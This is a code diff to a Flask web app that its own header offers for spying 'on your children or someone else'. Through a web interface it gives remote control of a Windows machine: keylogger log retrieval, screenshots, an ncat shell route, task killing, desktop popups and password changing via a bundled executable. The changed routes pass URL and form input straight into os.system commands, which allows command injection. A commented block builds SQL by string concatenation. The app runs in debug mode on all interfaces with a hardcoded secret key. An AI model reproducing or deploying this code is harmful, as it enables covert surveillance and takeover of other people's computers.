@@ -8,6 +8,8 @@ SecretZone button style has also been taken from CodePen LINK ::
 --> https://codepen.io/hilwat
 You can also use it to spy on your children or someone else
 """
+
+import logging
 import time
 from datetime import timedelta, datetime
 from flask import Flask, render_template, request, redirect, url_for, session, send_file, abort
@@ -15,22 +17,24 @@ import os
 import pyautogui
 from subprocess import check_output
 from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy import func
 # from email.mime import message, image, text, multipart, nonmultipart, base, audio
 
 
 wd = os.getcwd()
 app = Flask(__name__)
-# Here "admin:@localhost/test" ----->>> "mysql+pymysql://username:password@service_running_mysql_ip/database_name"
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://admin:@localhost/test'
+# Here admin:@localhost/test is username:password@service_running_mysql_ip/database_name
+# app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://admin:@localhost/test'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
 db = SQLAlchemy(app)
 # After this time user will logout from this web app
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=10)
 # These are ip's of devices wich can access this web app without any Username_Password
 allowed_ip = open("allowed_IP.txt", "r")
 allowed_ip = allowed_ip.read().split("\n")
-
 # This is function to check if user is in allowd ip's or not
+
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
 
 def ip_func(func):
@@ -51,7 +55,10 @@ class Contacts(db.Model):
     __tablename__ = 'Username_Password'
     Id = db.Column(db.Integer, primary_key=True)
     Password = db.Column(db.String(75))
-    Username = db.Column(db.String(50))
+    Username = db.Column(db.String(75))
+
+    def __repr__(self):
+        return "<Task %r>" % self.sr
 
 # This will login you in this web app if your username and password will matched with mysql database
 @app.route('/login', methods=['POST'])
@@ -59,16 +66,31 @@ def do_login():
     if request.method == 'POST':
         username = request.form['username']
         passwordd = request.form['password']
+
+        user = Contacts.query.filter(Contacts.Username == username).count()
+        user_pass = Contacts.query.filter(Contacts.Username == username).filter(
+            Contacts.Password == passwordd).count()
+        ###################################
+        """
         user = Contacts.query.filter(Contacts.Username == func.binary(username)).count()
         user_pass = Contacts.query.filter(Contacts.Username == func.binary(
             username)).filter(Contacts.Password == func.binary(passwordd)).count()
+        """
+        ###################################
+        """
+        user = db.session.execute(
+            "select * from Username_Password where username='" + username + "'").first()
+        user_pass = db.session.execute("select * from Username_Password where username='" +
+                                       username + "' and password='" + passwordd + "'").first()
+        """
+        ##################################
         if user:
             if user_pass:
                 session['logged_in'] = True
                 # session.permanent = True
                 return redirect(url_for('index1'))
-            elif user_pass == 0:
-                flash = ' Incorrect password '
+            elif not user_pass:
+                flash = ' Incorrect password for username '
                 return render_template("login.html", flash=flash)
         else:
             flash = ' Not any user found '
@@ -81,7 +103,7 @@ def do_signup():
         username = request.form["username"]
         passwordd = request.form["password"]
         passwordd1 = request.form['passwordr']
-        user = Contacts.query.filter(Contacts.Username == func.binary(username)).count()
+        user = Contacts.query.filter(Contacts.Username == username).count()
         if user:
             flash = "User already exist\nPlease try another username"
             return render_template("login.html", flash=flash)
@@ -130,6 +152,7 @@ def shutdown():
         return redirect(url_for("index"))
         # return "<h1>Because of security reason this funtion \nhas been removed and you have been entered time " + ttime + "</h1>"
 
+
 # This will send message to computer and reply to sender
 @app.route('/mesg', methods=['POST', 'GET'])
 def message():
@@ -140,13 +163,10 @@ def message():
             mesg = request.form['mesgg']
             meesg = str(mesg)
             alert = "alert(shail);"
-            print(meesg)
             pyautogui.alert(text=meesg, title='Alert box', button='OK')
-            print(meesg)
-            shail = pyautogui.prompt(text=meesg, title='Alert', default='')
-            print(meesg)
-            shail = "User say: " + str(shail)
-            print(meesg)
+            # shail = pyautogui.prompt(text=meesg, title='Alert', default='')
+            # shail = "User say: " + str(shail)
+            shail = "Message sent"
             return render_template('index.html', shail=shail, alert=alert)
 
 # This is only a menu
@@ -191,6 +211,7 @@ def shot_del():
             wd = os.getcwd()
             sshh = ("del " + '"' + wd +
                     "\\templates\\secret-zone\\screenshots\\captured\\" + namee + '.png"')
+            print(sshh)
             os.system(sshh)
             return redirect(url_for('screenshot'))
         else:
@@ -265,25 +286,43 @@ def ncat():
         os.system(shail)
         return redirect(url_for('secret_zone'))
 
+
 # this is web based windows task manager
 @app.route('/task')
 def task():
     if not session.get('logged_in'):
         return ip_func(func="task")
     else:
-        cmdd = check_output("tasklist", shell=True).decode(encoding="utf-8")
+        cmdd = check_output("tasklist", shell=True).split("\n")[3:-1]
+        for i in range(len(cmdd)):
+            cmdd[i] = cmdd[i].split()
+
+        for i in cmdd:
+            if "Services" in i:
+                i.remove("Services")
+            elif "Console" in i:
+                i.remove("Console")
+            del i[-3]
+
+        for i in range(len(cmdd)):
+            ll = []
+            for x in cmdd[i]:
+                if not x.isdigit():
+                    ll.append(x)
+                elif x.isdigit():
+                    cmdd[i] = [' '.join(ll), x, ' '.join((cmdd[i][-2], cmdd[i][-1]))]
+                    break
         return render_template("secret-zone/killer/taskkk.html", cmdd=cmdd)
 
+
 # This is web based windows task killer
-@app.route('/killer', methods=['POST', 'GET'])
-def killer():
+@app.route('/killer/<string:pid>', methods=['GET'])
+def killer(pid):
     if not session.get('logged_in'):
         return ip_func(func="killer")
     else:
-        if request.method == 'POST':
-            pid = request.form['pid']
-            os.system("taskkill /F /PID " + pid)
-            return redirect(url_for('task'))
+        os.system("taskkill /F /PID " + pid)
+        return redirect(url_for('task'))
 
 
 # This is windows keylogger
@@ -292,6 +331,13 @@ def logger():
     if not session.get('logged_in'):
         return ip_func(func="logger")
     else:
+        """
+        logger = ("type C:\\Users\\Public\\System32Log.txt")
+        loggs = str(check_output(logger, shell=True))  # .decode(encoding="utf-8")
+        print(loggs)
+        loggs = base64.b64encode(loggs.encode('utf_16_le')).decode('utf-8')
+        print(loggs)
+        """
         file = open("C:\\Users\\Public\\System32Log.txt", "r")
         loggs = file.read()
         file.close()
@@ -330,9 +376,10 @@ def password():
             passw = request.form['pasw']
             time.sleep(3)
             shail = ('"' + wd + "\\static\\sys-gamer.exe" + '" ' + passw)
-            changed = (check_output(shail).decode())
-            print(changed)
-            if changed == u'ha\r\n':  # True
+            # print (shail)
+            changed = os.system(shail)
+            # print(changed)
+            if changed == 0:  # True
                 return html_pass2
             else:  # False
                 return html_pass1
@@ -440,7 +487,7 @@ def test():
 # error handler section starts
 @app.errorhandler(404)
 def page_not_found(e):
-    return "<h1><center>Your page is not found<br>Ha ha ha !!!</center></h1>", 404
+    return "<h1><center>Your page is not found duffer<br>Ha ha ha !!!</center></h1>", 404
 
 
 @app.errorhandler(405)
@@ -450,5 +497,5 @@ def page(e):
 
 
 if __name__ == '__main__':
-    app.secret_key = "secretkey"
-    app.run(debug=True, host="0.0.0.0", port=80)
+    app.secret_key = "shail567is789hacker"
+    app.run(debug=True, host="0.0.0.0", port=81)
